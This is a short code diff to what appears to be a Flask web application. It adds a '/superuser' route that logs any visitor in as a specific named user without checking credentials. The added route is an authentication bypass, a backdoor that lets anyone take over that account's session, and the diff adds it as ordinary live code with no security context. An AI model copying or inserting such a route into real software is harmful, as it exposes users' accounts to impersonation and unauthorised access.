@@ -78,6 +78,12 @@ def logout():
         logout_user()
     return redirect(url_for('home'))
 
+@app.route('/superuser')
+def superuser():
+    user=User.query.filter_by(nickname="ShiroatoHiro").first()
+    login_user(user)
+    return redirect(url_for('home'))
+
 ####################################################
 #メインの関数
 def get_nickname():
